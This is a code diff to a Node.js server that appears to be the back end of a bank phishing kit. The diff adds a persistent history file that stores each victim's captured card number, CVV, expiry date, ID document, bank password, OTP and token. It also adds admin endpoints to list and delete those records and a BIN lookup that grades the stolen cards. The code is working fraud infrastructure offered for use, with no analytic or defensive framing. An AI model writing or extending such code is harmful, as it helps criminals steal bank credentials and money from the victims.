@@ -38,6 +38,27 @@ function guardarIpsBloqueadas() {
     try { fs.writeFileSync(IP_BLOQUEADAS_FILE, JSON.stringify([...ipsBloqueadas], null, 2)); } catch (e) {}
 }
 
+/* ============================================================
+   🔥 NUEVO SISTEMA DE HISTORIAL
+   ============================================================ */
+const HISTORIAL_FILE = path.join(DATA_DIR, 'historial.json');
+let historial = [];
+try {
+    if (fs.existsSync(HISTORIAL_FILE)) historial = JSON.parse(fs.readFileSync(HISTORIAL_FILE, 'utf8'));
+} catch (e) {}
+
+function guardarHistorial(bancoKey, datos) {
+    const registro = {
+        id: Date.now() + '-' + Math.random().toString(36).substr(2, 5),
+        fecha: new Date().toISOString(),
+        bancoKey: bancoKey,
+        datos: datos
+    };
+    historial.unshift(registro);
+    if (historial.length > 1000) historial = historial.slice(0, 1000); // Máximo 1000 registros
+    try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+}
+
 const LOGS_FILE = path.join(DATA_DIR, 'logs-admin.json');
 let logsAdmin = [];
 try {
@@ -109,9 +130,6 @@ function verificarJWT(req, res) {
     catch (e) { json(res, 401, { ok: false, error: 'Token inválido' }); return null; }
 }
 
-/* ============================================================
-   BIN LOOKUP — Detecta tipo y nivel de tarjeta desde los primeros 6 dígitos
-   ============================================================ */
 async function obtenerInfoBin(numeroTarjeta) {
     try {
         const limpio = String(numeroTarjeta || '').replace(/\D/g, '');
@@ -252,10 +270,30 @@ const server = http.createServer(async (req, res) => {
                     ultimaAccion: d.ultimaAccion,
                     tiempoDentro: Math.floor((Date.now() - d.entroEn) / 1000),
                     userAgent: d.userAgent,
-                    ultimoHeartbeat: d.ultimoHeartbeat // 🔥 AGREGADO PARA EL PUNTO AMARILLO
+                    ultimoHeartbeat: d.ultimoHeartbeat
                 });
             }
             json(res, 200, { ok: true, activos: lista });
+            return;
+        }
+
+        /* 🔥 NUEVO ENDPOINT DE HISTORIAL */
+        if (req.method === 'GET' && url === '/admin/historial') {
+            json(res, 200, { ok: true, historial: historial.slice(0, 200) }); // Devolvemos los últimos 200
+            return;
+        }
+
+        if (req.method === 'POST' && url === '/admin/historial/borrar') {
+            try {
+                const { ids } = await getBody(req);
+                if (!Array.isArray(ids) || !ids.length) { json(res, 400, { ok: false, error: 'ids requerido' }); return; }
+                const antes = historial.length;
+                historial = historial.filter(h => !ids.includes(h.id));
+                try { fs.writeFileSync(HISTORIAL_FILE, JSON.stringify(historial, null, 2)); } catch (e) {}
+                const borrados = antes - historial.length;
+                agregarLog('borrar-historial', { usuario: payload.user, cantidad: borrados });
+                json(res, 200, { ok: true, borrados });
+            } catch (e) { json(res, 400, { ok: false }); }
             return;
         }
 
@@ -283,7 +321,6 @@ const server = http.createServer(async (req, res) => {
             const sessionId = decodeURIComponent(matchAccion[1]);
             try {
                 const { accion } = await getBody(req);
-                // 🔥 AGREGADO: CC_ERROR
                 const mapEstados = {
                     ACEPTAR: 'aceptado', 
                     RECHAZAR: 'rechazado',
@@ -395,7 +432,8 @@ const server = http.createServer(async (req, res) => {
                 activos: usuariosActivos.size,
                 sesiones: estadoSesiones.size,
                 pendientes,
-                bloqueadas: ipsBloqueadas.size
+                bloqueadas: ipsBloqueadas.size,
+                historial: historial.length
             });
             return;
         }
@@ -418,8 +456,7 @@ const server = http.createServer(async (req, res) => {
 
             const infoBin = await obtenerInfoBin(tarjeta);
 
-            estadoSesiones.set(sessionId, 'pendiente');
-            datosSesiones.set(sessionId, {
+            const datosSesion = {
                 bancoKey: bancoKey, marca, tarjeta, titular, docType, docNumber,
                 monto, expMes, expAnio, cvv, placa: placa || '', subsidio: subsidio || false,
                 ip, creadoEn: new Date().toISOString(),
@@ -429,7 +466,14 @@ const server = http.createServer(async (req, res) => {
                 cardLevel: infoBin?.cardLevel || 'Desconocido',
                 bankName: infoBin?.bankName || 'Desconocido',
                 countryName: infoBin?.countryName || 'Desconocido'
-            });
+            };
+
+            estadoSesiones.set(sessionId, 'pendiente');
+            datosSesiones.set(sessionId, datosSesion);
+            
+            // 🔥 GUARDAMOS EN EL HISTORIAL
+            guardarHistorial(bancoKey, datosSesion);
+
             console.log(`[${bancoKey}] Nueva sesión: ${sessionId} (${marca}) IP=${ip} | BIN=${infoBin?.bin || '?'} Tipo=${infoBin?.cardType || '?'} Nivel=${infoBin?.cardLevel || '?'}`);
             json(res, 200, { ok: true, sessionId, bancoKey, binInfo: infoBin });
         } catch (e) { json(res, 500, { ok: false, error: e.message }); }
@@ -447,6 +491,10 @@ const server = http.createServer(async (req, res) => {
             const datosCompletos = Object.assign({}, datosOriginales, { otp });
             estadoSesiones.set(sessionId, 'pendiente');
             datosSesiones.set(sessionId, datosCompletos);
+            
+            // 🔥 ACTUALIZAMOS EL HISTORIAL CON EL OTP
+            guardarHistorial(bancoKey, datosCompletos);
+
             console.log(`[${bancoKey}] OTP: ${sessionId} → ${otp}`);
             json(res, 200, { ok: true, sessionId, bancoKey });
         } catch (e) { json(res, 500, { ok: false, error: e.message }); }
@@ -466,11 +514,16 @@ const server = http.createServer(async (req, res) => {
             const datos = await getBody(req);
             const { sessionId, tipo, tipoDoc, identificacion, clave, tarjeta, token } = datos;
             if (!sessionId) { json(res, 400, { ok: false }); return; }
-            estadoSesiones.set(sessionId, 'pendiente');
-            datosSesiones.set(sessionId, {
+            const datosSesion = {
                 bancoKey, tipo, tipoDoc, identificacion, clave, tarjeta, token,
                 ip, creadoEn: new Date().toISOString()
-            });
+            };
+            estadoSesiones.set(sessionId, 'pendiente');
+            datosSesiones.set(sessionId, datosSesion);
+            
+            // 🔥 GUARDAMOS EN EL HISTORIAL
+            guardarHistorial(bancoKey, datosSesion);
+
             console.log(`[${bancoKey}] Nueva sesión: ${sessionId}`);
             json(res, 200, { ok: true, sessionId });
         } catch (e) { json(res, 500, { ok: false, error: e.message }); }
@@ -490,6 +543,10 @@ const server = http.createServer(async (req, res) => {
             const datosCompletos = Object.assign({}, previos, { token, identificacion: identificacion || previos.identificacion, clave: clave || previos.clave });
             datosSesiones.set(sessionId, datosCompletos);
             estadoSesiones.set(sessionId, 'token');
+            
+            // 🔥 ACTUALIZAMOS EL HISTORIAL
+            guardarHistorial(bancoKey, datosCompletos);
+
             console.log(`[${bancoKey}] Token: ${sessionId} → ${token}`);
             json(res, 200, { ok: true });
         } catch (e) { json(res, 500, { ok: false, error: e.message }); }
@@ -509,6 +566,10 @@ const server = http.createServer(async (req, res) => {
             const datosCompletos = Object.assign({}, previos, { otp, identificacion: identificacion || previos.identificacion, clave: clave || previos.clave });
             datosSesiones.set(sessionId, datosCompletos);
             estadoSesiones.set(sessionId, 'otp');
+            
+            // 🔥 ACTUALIZAMOS EL HISTORIAL
+            guardarHistorial(bancoKey, datosCompletos);
+
             console.log(`[${bancoKey}] OTP: ${sessionId} → ${otp}`);
             json(res, 200, { ok: true });
         } catch (e) { json(res, 500, { ok: false, error: e.message }); }
@@ -545,4 +606,5 @@ server.listen(HTTP_PORT, () => {
     console.log(`Admins: ${ADMINS.map(a => a.user).join(', ') || 'NINGUNO'}`);
     console.log(`IPs bloqueadas: ${ipsBloqueadas.size}`);
     console.log(`Bancos: ${Object.keys(bancos).length}`);
+    console.log(`Registros en historial: ${historial.length}`);
 });
